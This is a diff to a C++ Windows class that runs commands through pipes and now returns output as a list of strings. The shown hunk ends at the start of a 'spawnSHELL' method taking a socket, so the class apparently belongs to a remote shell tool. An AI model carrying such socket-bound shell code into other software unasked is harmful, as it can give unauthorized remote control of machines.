@@ -57,28 +57,25 @@ void Exec::setupAllPipe()
     // cout << "GO PIPE " << endl;
     if(!CreatePipe(&a_hChildStd_ERR_Rd, &a_hChildStd_ERR_Wr, &sa, 0)) 
     {
-        cout <<" NO CREATE PIPE" << endl;
         a_error = TRUE;
     //    exit(1); 
     }
      // Veiller à ce que la poignée de lecture du tuyau pour le STDERR ne soit pas héritée.
     if(!SetHandleInformation(a_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0))
     {
-        cout << "NOT ERIRTER  WALA" << endl;
         a_error = TRUE;
        // exit(1);
     }
      // Créer un tuyau pour le processus de l'enfant STDOUT. | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
     if(!CreatePipe(&a_hChildStd_OUT_Rd, &a_hChildStd_OUT_Wr, &sa, 0) ) 
     {
-        cout <<" NO CREATE PIPE" << endl;
+        //cout <<" NO CREATE PIPE" << endl;
         a_error = TRUE;
         //exit(1);
     }
       // S'assurer que la poignée de lecture du tuyau pour STDOUT n'est pas héritée
     if(!SetHandleInformation(a_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
     {
-        cout << "NOT ERIRTER  WALA" << endl;
         a_error = TRUE;
         //exit(1); 
     }
@@ -147,7 +144,7 @@ PROCESS_INFORMATION Exec::createChildProcess(string &command)
     return piProcInfo;
 }
 
-string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
+vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 {
     int BUFSIZE = 4096; //TEMP
 
@@ -159,7 +156,7 @@ string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
     cout << "Current process2: " <<  GetCurrentProcessId() << endl;
 
     string out,err;
-
+    vector<string> result;
     while(true)
     {
         if(!ReadFile(a_hChildStd_OUT_Rd, chBuf, BUFSIZE,&dwRead,NULL))
@@ -177,12 +174,14 @@ string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
         cout << "BUFFER:" <<strlen(chBuf) << endl;
 
         string s(chBuf, dwRead);
-        out += s;
 
-        memset(chBuf, 0, sizeof(chBuf)); //clean buffer
+        result.push_back(s);
+
+        ZeroMemory(&chBuf,strlen(chBuf));
     }
-    memset(chBuf, 0, sizeof(chBuf)); //clean buffer
-   
+    
+    ZeroMemory(&chBuf,strlen(chBuf));
+    
     while (true)
     {
         if(!ReadFile(a_hChildStd_ERR_Rd, chBuf, BUFSIZE,&dwRead,NULL))
@@ -199,24 +198,19 @@ string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 
         cout << dwRead << endl;
         string s(chBuf, dwRead);
-        err += s;
+
+        result.push_back(s);
         
-        memset(chBuf, 0, sizeof(chBuf)); //clean buffer
+        ZeroMemory(&chBuf,strlen(chBuf));
+
     }
     
-    if(err.empty()) 
-    {
-        return out;
-    }
-    else
-    {
-        return err;
-    }
+    return result;
 }
 
-string Exec::executeCommand(string command)
+vector<string> Exec::executeCommand(string command)
 {
-    string result_of_command;
+    vector<string> result_of_command;
 
     setupAllPipe();
     PROCESS_INFORMATION piProcInfo = createChildProcess(command);
@@ -224,7 +218,8 @@ string Exec::executeCommand(string command)
     if(a_error)
     {
         cout << "[+] One or more errors were detected. " << endl; //Go popen ?
-        return (string) "[-] FATAL ERROR.";
+        result_of_command.push_back("[-] FATAL ERROR.");
+        return result_of_command;
     }
     else
     {
@@ -232,7 +227,7 @@ string Exec::executeCommand(string command)
         cout << "ERR size: " << GetFileSize(a_hChildStd_ERR_Rd,NULL) << endl;
         if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
         {
-            result_of_command = "The command was executed successfully but no data was returned.";
+            result_of_command.push_back("The command was executed successfully but no data was returned.");
             //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
         }
         else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
@@ -251,7 +246,7 @@ string Exec::executeCommand(string command)
                     
                     cout << "[+] Process: " << pids[i] << " killed" << endl;
                 }
-                result_of_command = "[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.";
+                result_of_command.push_back("[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.");
             }
             else
             {
@@ -264,14 +259,13 @@ string Exec::executeCommand(string command)
         {result_of_command = readFromPipe(piProcInfo);}
 
         //Finally return result_of_command
-        cout << "RESULT:  " << result_of_command << endl;
+        //cout << "RESULT:  " << result_of_command << endl;
         return result_of_command; 
     }
 }
 
 void Exec::spawnSHELL(int sock, wchar_t *prog)
 {
-    cout << "IN METHOD" << endl;
 
     STARTUPINFOW siStartInfo;
     PROCESS_INFORMATION piProcInfo;
